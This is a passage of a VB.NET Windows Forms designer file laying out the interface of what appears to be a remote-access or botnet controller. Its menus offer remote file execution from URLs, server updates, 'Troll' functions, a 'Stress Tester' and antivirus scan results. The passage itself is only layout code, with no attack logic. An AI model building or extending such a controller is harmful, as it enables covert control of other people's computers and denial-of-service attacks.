        '
        Me.ToolStripMenuItem2.Name = "ToolStripMenuItem2"
        Me.ToolStripMenuItem2.Size = New System.Drawing.Size(164, 6)
        '
        'ServerOptionsToolStripMenuItem
        '
        Me.ServerOptionsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.UpdateServerToolStripMenuItem, Me.ExecuteFileToolStripMenuItem, Me.PingToolStripMenuItem, Me.RestartToolStripMenuItem, Me.DisconnectToolStripMenuItem, Me.UninstallToolStripMenuItem})
        Me.ServerOptionsToolStripMenuItem.Image = CType(resources.GetObject("ServerOptionsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ServerOptionsToolStripMenuItem.Name = "ServerOptionsToolStripMenuItem"
        Me.ServerOptionsToolStripMenuItem.Size = New System.Drawing.Size(167, 22)
        Me.ServerOptionsToolStripMenuItem.Text = "Server Options"
        '
        'UpdateServerToolStripMenuItem
        '
        Me.UpdateServerToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.FromFileToolStripMenuItem, Me.FromURLToolStripMenuItem})
        Me.UpdateServerToolStripMenuItem.Image = CType(resources.GetObject("UpdateServerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.UpdateServerToolStripMenuItem.Name = "UpdateServerToolStripMenuItem"
        Me.UpdateServerToolStripMenuItem.Size = New System.Drawing.Size(147, 22)
        Me.UpdateServerToolStripMenuItem.Text = "Update Server"
        '
        'FromFileToolStripMenuItem
        '
        Me.FromFileToolStripMenuItem.Image = CType(resources.GetObject("FromFileToolStripMenuItem.Image"), System.Drawing.Image)
        Me.FromFileToolStripMenuItem.Name = "FromFileToolStripMenuItem"
        Me.FromFileToolStripMenuItem.Size = New System.Drawing.Size(126, 22)
        Me.FromFileToolStripMenuItem.Text = "From File"
        '
        'FromURLToolStripMenuItem
        '
        Me.FromURLToolStripMenuItem.Image = CType(resources.GetObject("FromURLToolStripMenuItem.Image"), System.Drawing.Image)
        Me.FromURLToolStripMenuItem.Name = "FromURLToolStripMenuItem"
        Me.FromURLToolStripMenuItem.Size = New System.Drawing.Size(126, 22)
        Me.FromURLToolStripMenuItem.Text = "From URL"
        '
        'ExecuteFileToolStripMenuItem
        '
        Me.ExecuteFileToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.FromFileToolStripMenuItem1, Me.FromURLToolStripMenuItem1})
        Me.ExecuteFileToolStripMenuItem.Image = CType(resources.GetObject("ExecuteFileToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ExecuteFileToolStripMenuItem.Name = "ExecuteFileToolStripMenuItem"
        Me.ExecuteFileToolStripMenuItem.Size = New System.Drawing.Size(147, 22)
        Me.ExecuteFileToolStripMenuItem.Text = "Execute File"
        '
        'FromFileToolStripMenuItem1
        '
        Me.FromFileToolStripMenuItem1.Image = CType(resources.GetObject("FromFileToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.FromFileToolStripMenuItem1.Name = "FromFileToolStripMenuItem1"
        Me.FromFileToolStripMenuItem1.Size = New System.Drawing.Size(126, 22)
        Me.FromFileToolStripMenuItem1.Text = "From File"
        '
        'FromURLToolStripMenuItem1
        '
        Me.FromURLToolStripMenuItem1.Image = CType(resources.GetObject("FromURLToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.FromURLToolStripMenuItem1.Name = "FromURLToolStripMenuItem1"
        Me.FromURLToolStripMenuItem1.Size = New System.Drawing.Size(126, 22)
        Me.FromURLToolStripMenuItem1.Text = "From URL"
        '
        'PingToolStripMenuItem
        '
        Me.PingToolStripMenuItem.Image = CType(resources.GetObject("PingToolStripMenuItem.Image"), System.Drawing.Image)
        Me.PingToolStripMenuItem.Name = "PingToolStripMenuItem"
        Me.PingToolStripMenuItem.Size = New System.Drawing.Size(147, 22)
        Me.PingToolStripMenuItem.Text = "Ping"
        '
        'RestartToolStripMenuItem
        '
        Me.RestartToolStripMenuItem.Image = CType(resources.GetObject("RestartToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RestartToolStripMenuItem.Name = "RestartToolStripMenuItem"
        Me.RestartToolStripMenuItem.Size = New System.Drawing.Size(147, 22)
        Me.RestartToolStripMenuItem.Text = "Restart"
        '
        'DisconnectToolStripMenuItem
        '
        Me.DisconnectToolStripMenuItem.Image = CType(resources.GetObject("DisconnectToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DisconnectToolStripMenuItem.Name = "DisconnectToolStripMenuItem"
        Me.DisconnectToolStripMenuItem.Size = New System.Drawing.Size(147, 22)
        Me.DisconnectToolStripMenuItem.Text = "Disconnect"
        '
        'UninstallToolStripMenuItem
        '
        Me.UninstallToolStripMenuItem.Image = CType(resources.GetObject("UninstallToolStripMenuItem.Image"), System.Drawing.Image)
        Me.UninstallToolStripMenuItem.Name = "UninstallToolStripMenuItem"
        Me.UninstallToolStripMenuItem.Size = New System.Drawing.Size(147, 22)
        Me.UninstallToolStripMenuItem.Text = "Uninstall"
        '
        'MiscelleanousToolStripMenuItem
        '
        Me.MiscelleanousToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ScriptingToolStripMenuItem, Me.ChatToolStripMenuItem, Me.MessageBoxToolStripMenuItem, Me.InputBoxToolStripMenuItem, Me.TrollFunFunctionsToolStripMenuItem})
        Me.MiscelleanousToolStripMenuItem.Image = CType(resources.GetObject("MiscelleanousToolStripMenuItem.Image"), System.Drawing.Image)
        Me.MiscelleanousToolStripMenuItem.Name = "MiscelleanousToolStripMenuItem"
        Me.MiscelleanousToolStripMenuItem.Size = New System.Drawing.Size(167, 22)
        Me.MiscelleanousToolStripMenuItem.Text = "Miscelleanous"
        '
        'ScriptingToolStripMenuItem
        '
        Me.ScriptingToolStripMenuItem.Image = CType(resources.GetObject("ScriptingToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ScriptingToolStripMenuItem.Name = "ScriptingToolStripMenuItem"
        Me.ScriptingToolStripMenuItem.Size = New System.Drawing.Size(184, 22)
        Me.ScriptingToolStripMenuItem.Text = "Scripting"
        '
        'ChatToolStripMenuItem
        '
        Me.ChatToolStripMenuItem.Image = CType(resources.GetObject("ChatToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ChatToolStripMenuItem.Name = "ChatToolStripMenuItem"
        Me.ChatToolStripMenuItem.Size = New System.Drawing.Size(184, 22)
        Me.ChatToolStripMenuItem.Text = "Chat"
        '
        'MessageBoxToolStripMenuItem
        '
        Me.MessageBoxToolStripMenuItem.Image = CType(resources.GetObject("MessageBoxToolStripMenuItem.Image"), System.Drawing.Image)
        Me.MessageBoxToolStripMenuItem.Name = "MessageBoxToolStripMenuItem"
        Me.MessageBoxToolStripMenuItem.Size = New System.Drawing.Size(184, 22)
        Me.MessageBoxToolStripMenuItem.Text = "MessageBox"
        '
        'InputBoxToolStripMenuItem
        '
        Me.InputBoxToolStripMenuItem.Image = CType(resources.GetObject("InputBoxToolStripMenuItem.Image"), System.Drawing.Image)
        Me.InputBoxToolStripMenuItem.Name = "InputBoxToolStripMenuItem"
        Me.InputBoxToolStripMenuItem.Size = New System.Drawing.Size(184, 22)
        Me.InputBoxToolStripMenuItem.Text = "InputBox"
        '
        'TrollFunFunctionsToolStripMenuItem
        '
        Me.TrollFunFunctionsToolStripMenuItem.Image = CType(resources.GetObject("TrollFunFunctionsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.TrollFunFunctionsToolStripMenuItem.Name = "TrollFunFunctionsToolStripMenuItem"
        Me.TrollFunFunctionsToolStripMenuItem.Size = New System.Drawing.Size(184, 22)
        Me.TrollFunFunctionsToolStripMenuItem.Text = "Troll / Fun Functions"
        '
        'AdminToolsToolStripMenuItem
        '
        Me.AdminToolsToolStripMenuItem.Image = CType(resources.GetObject("AdminToolsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.AdminToolsToolStripMenuItem.Name = "AdminToolsToolStripMenuItem"
        Me.AdminToolsToolStripMenuItem.Size = New System.Drawing.Size(167, 22)
        Me.AdminToolsToolStripMenuItem.Text = "Admin Tools"
        '
        'ToolStripMenuItem3
        '
        Me.ToolStripMenuItem3.Name = "ToolStripMenuItem3"
        Me.ToolStripMenuItem3.Size = New System.Drawing.Size(164, 6)
        '
        'StressTesterToolStripMenuItem
        '
        Me.StressTesterToolStripMenuItem.Image = CType(resources.GetObject("StressTesterToolStripMenuItem.Image"), System.Drawing.Image)
        Me.StressTesterToolStripMenuItem.Name = "StressTesterToolStripMenuItem"
        Me.StressTesterToolStripMenuItem.Size = New System.Drawing.Size(167, 22)
        Me.StressTesterToolStripMenuItem.Text = "Stress Tester"
        '
        'MapViewToolStripMenuItem
        '
        Me.MapViewToolStripMenuItem.Image = CType(resources.GetObject("MapViewToolStripMenuItem.Image"), System.Drawing.Image)
        Me.MapViewToolStripMenuItem.Name = "MapViewToolStripMenuItem"
        Me.MapViewToolStripMenuItem.Size = New System.Drawing.Size(167, 22)
        Me.MapViewToolStripMenuItem.Text = "Map View"
        '
        'TorrentSeederToolStripMenuItem
        '
        Me.TorrentSeederToolStripMenuItem.Image = CType(resources.GetObject("TorrentSeederToolStripMenuItem.Image"), System.Drawing.Image)
        Me.TorrentSeederToolStripMenuItem.Name = "TorrentSeederToolStripMenuItem"
        Me.TorrentSeederToolStripMenuItem.Size = New System.Drawing.Size(167, 22)
        Me.TorrentSeederToolStripMenuItem.Text = "Torrent Seeder"
        '
        'LVC_Time
        '
        Me.LVC_Time.AllowResize = False
        Me.LVC_Time.Name = "LVC_Time"
        Me.LVC_Time.Text = "Time"
        Me.LVC_Time.Width = 77
        '
        'LVC_Log
        '
        Me.LVC_Log.Name = "LVC_Log"
        Me.LVC_Log.Text = "Log"
        Me.LVC_Log.Width = 757
        '
        'CMS_Logs
        '
        Me.CMS_Logs.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ClearToolStripMenuItem})
        Me.CMS_Logs.Name = "CMS_Logs"
        Me.CMS_Logs.Size = New System.Drawing.Size(102, 26)
        '
        'ClearToolStripMenuItem
        '
        Me.ClearToolStripMenuItem.Name = "ClearToolStripMenuItem"
        Me.ClearToolStripMenuItem.Size = New System.Drawing.Size(101, 22)
        Me.ClearToolStripMenuItem.Text = "Clear"
        '
        'BetterListViewColumnHeader5
        '
        Me.BetterListViewColumnHeader5.Name = "BetterListViewColumnHeader5"
        Me.BetterListViewColumnHeader5.Text = "Action"
        Me.BetterListViewColumnHeader5.Width = 162
        '
        'BetterListViewColumnHeader6
        '
        Me.BetterListViewColumnHeader6.Name = "BetterListViewColumnHeader6"
        Me.BetterListViewColumnHeader6.Text = "Information"
        Me.BetterListViewColumnHeader6.Width = 368
        '
        'BetterListViewColumnHeader7
        '
        Me.BetterListViewColumnHeader7.Name = "BetterListViewColumnHeader7"
        Me.BetterListViewColumnHeader7.Text = "Perform Action For"
        Me.BetterListViewColumnHeader7.Width = 155
        '
        'BetterListViewColumnHeader3
        '
        Me.BetterListViewColumnHeader3.Name = "BetterListViewColumnHeader3"
        Me.BetterListViewColumnHeader3.Text = "Title"
        Me.BetterListViewColumnHeader3.Width = 136
        '
        'BetterListViewColumnHeader4
        '
        Me.BetterListViewColumnHeader4.Name = "BetterListViewColumnHeader4"
        Me.BetterListViewColumnHeader4.Text = "Date"
        '
        'BetterListViewColumnHeader1
        '
        Me.BetterListViewColumnHeader1.Name = "BetterListViewColumnHeader1"
        Me.BetterListViewColumnHeader1.Text = "Antivirus Engine"
        Me.BetterListViewColumnHeader1.Width = 431
        '
        'BetterListViewColumnHeader2
        '
        Me.BetterListViewColumnHeader2.Name = "BetterListViewColumnHeader2"
        Me.BetterListViewColumnHeader2.Text = "Scan Result"
        Me.BetterListViewColumnHeader2.Width = 404
        '
        'IL_TabControl
        '
        Me.IL_TabControl.ImageStream = CType(resources.GetObject("IL_TabControl.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.IL_TabControl.TransparentColor = System.Drawing.Color.Transparent
        Me.IL_TabControl.Images.SetKeyName(0, "user_male_olive_blue_black.png")
        Me.IL_TabControl.Images.SetKeyName(1, "gear_blue.png")
        Me.IL_TabControl.Images.SetKeyName(2, "icon-seo.png")
        Me.IL_TabControl.Images.SetKeyName(3, "bookmark_blue.png")
        Me.IL_TabControl.Images.SetKeyName(4, "hyperlink_blue.png")
        Me.IL_TabControl.Images.SetKeyName(5, "cinema_display_old_front_blue.png")
        Me.IL_TabControl.Images.SetKeyName(6, "feeds_blue.png")
        Me.IL_TabControl.Images.SetKeyName(7, "flag_blue.png")
        Me.IL_TabControl.Images.SetKeyName(8, "protect_blue.png")
        Me.IL_TabControl.Images.SetKeyName(9, "wall_blue.png")
        '
        'IL_OnConnect
        '
        Me.IL_OnConnect.ImageStream = CType(resources.GetObject("IL_OnConnect.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.IL_OnConnect.TransparentColor = System.Drawing.Color.Transparent
        Me.IL_OnConnect.Images.SetKeyName(0, "chain-icon.png")
        Me.IL_OnConnect.Images.SetKeyName(1, "FileOptionsToolStripMenuItem.jpg")
        Me.IL_OnConnect.Images.SetKeyName(2, "512279.png")
        Me.IL_OnConnect.Images.SetKeyName(3, "btn_loadhosts.Image.jpg")
        Me.IL_OnConnect.Images.SetKeyName(4, "ChangeWindowCaptionToolStripMenuItem.Image.jpg")
        Me.IL_OnConnect.Images.SetKeyName(5, "HideToolStripMenuItem.Image.jpg")
        Me.IL_OnConnect.Images.SetKeyName(6, "btn_stop.jpg")
        Me.IL_OnConnect.Images.SetKeyName(7, "btn_clear.jpg")
        Me.IL_OnConnect.Images.SetKeyName(8, "arrow-circle-045-left.png")
        '
        'CMS_OnConnect
        '
        Me.CMS_OnConnect.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RemoveToolStripMenuItem})
        Me.CMS_OnConnect.Name = "CMS_OnConnect"
        Me.CMS_OnConnect.Size = New System.Drawing.Size(118, 26)
        '
        'RemoveToolStripMenuItem
        '
        Me.RemoveToolStripMenuItem.Name = "RemoveToolStripMenuItem"
        Me.RemoveToolStripMenuItem.Size = New System.Drawing.Size(117, 22)
        Me.RemoveToolStripMenuItem.Text = "Remove"
        '
        'Timer1
        '
        Me.Timer1.Interval = 63
        '
        'ImageListView11
        '
        Me.ImageListView11.DefaultImage = CType(resources.GetObject("ImageListView11.DefaultImage"), System.Drawing.Image)
        Me.ImageListView11.ErrorImage = CType(resources.GetObject("ImageListView11.ErrorImage"), System.Drawing.Image)
        Me.ImageListView11.HeaderFont = New System.Drawing.Font("Tahoma", 8.0!)
        Me.ImageListView11.Location = New System.Drawing.Point(0, 0)
        Me.ImageListView11.Name = "ImageListView11"
        Me.ImageListView11.Size = New System.Drawing.Size(120, 100)
        Me.ImageListView11.TabIndex = 0
        Me.ImageListView11.Text = ""
        '
        'IL_CountryFlags
        '
        Me.IL_CountryFlags.ImageStream = CType(resources.GetObject("IL_CountryFlags.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.IL_CountryFlags.TransparentColor = System.Drawing.Color.Transparent
        Me.IL_CountryFlags.Images.SetKeyName(0, "ad.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(1, "ae.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(2, "af.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(3, "ag.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(4, "ai.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(5, "al.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(6, "am.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(7, "an.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(8, "ao.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(9, "ar.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(10, "as.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(11, "at.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(12, "au.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(13, "aw.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(14, "ax.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(15, "az.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(16, "ba.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(17, "bb.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(18, "bd.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(19, "be.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(20, "bf.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(21, "bg.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(22, "bh.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(23, "bi.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(24, "bj.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(25, "bm.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(26, "bn.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(27, "bo.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(28, "br.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(29, "bs.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(30, "bt.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(31, "bv.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(32, "bw.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(33, "by.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(34, "bz.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(35, "ca.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(36, "cc.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(37, "cd.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(38, "cf.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(39, "cg.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(40, "ch.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(41, "ci.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(42, "ck.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(43, "cl.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(44, "cm.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(45, "cn.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(46, "co.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(47, "cr.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(48, "cs.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(49, "cu.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(50, "cv.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(51, "cx.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(52, "cy.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(53, "cz.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(54, "de.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(55, "dj.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(56, "dk.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(57, "dm.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(58, "do.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(59, "dz.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(60, "ec.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(61, "ee.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(62, "eg.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(63, "eh.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(64, "er.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(65, "es.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(66, "et.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(67, "fi.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(68, "fj.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(69, "fk.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(70, "fm.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(71, "fo.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(72, "fr.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(73, "ga.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(74, "gb.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(75, "gd.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(76, "ge.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(77, "gf.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(78, "gh.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(79, "gi.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(80, "gl.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(81, "gm.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(82, "gn.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(83, "gp.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(84, "gq.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(85, "gr.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(86, "gs.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(87, "gt.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(88, "gu.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(89, "gw.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(90, "gy.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(91, "hk.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(92, "hm.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(93, "hn.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(94, "hr.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(95, "ht.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(96, "hu.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(97, "id.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(98, "ie.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(99, "il.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(100, "in.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(101, "io.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(102, "iq.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(103, "ir.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(104, "is.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(105, "it.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(106, "jm.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(107, "jo.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(108, "jp.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(109, "ke.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(110, "kg.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(111, "kh.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(112, "ki.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(113, "km.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(114, "kn.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(115, "kp.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(116, "kr.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(117, "kw.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(118, "ky.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(119, "kz.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(120, "la.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(121, "lb.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(122, "lc.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(123, "li.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(124, "lk.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(125, "lr.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(126, "ls.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(127, "lt.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(128, "lu.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(129, "lv.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(130, "ly.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(131, "ma.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(132, "mc.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(133, "md.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(134, "me.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(135, "mg.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(136, "mh.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(137, "mk.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(138, "ml.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(139, "mm.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(140, "mn.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(141, "mo.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(142, "mp.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(143, "mq.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(144, "mr.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(145, "ms.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(146, "mt.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(147, "mu.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(148, "mv.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(149, "mw.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(150, "mx.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(151, "my.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(152, "mz.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(153, "na.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(154, "nc.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(155, "ne.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(156, "nf.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(157, "ng.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(158, "ni.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(159, "nl.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(160, "no.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(161, "np.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(162, "nr.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(163, "nu.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(164, "nz.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(165, "om.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(166, "pa.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(167, "pe.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(168, "pf.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(169, "pg.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(170, "ph.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(171, "pk.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(172, "pl.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(173, "pm.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(174, "pn.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(175, "pr.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(176, "ps.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(177, "pt.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(178, "pw.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(179, "py.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(180, "qa.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(181, "re.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(182, "ro.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(183, "rs.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(184, "ru.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(185, "rw.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(186, "sa.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(187, "sb.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(188, "sc.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(189, "sd.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(190, "se.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(191, "sg.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(192, "sh.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(193, "si.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(194, "sj.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(195, "sk.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(196, "sl.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(197, "sm.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(198, "sn.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(199, "so.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(200, "sr.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(201, "st.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(202, "sv.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(203, "sy.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(204, "sz.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(205, "tc.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(206, "td.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(207, "tf.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(208, "tg.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(209, "th.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(210, "tj.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(211, "tk.bmp")
        Me.IL_CountryFlags.Images.SetKeyName(212, "tl.bmp")
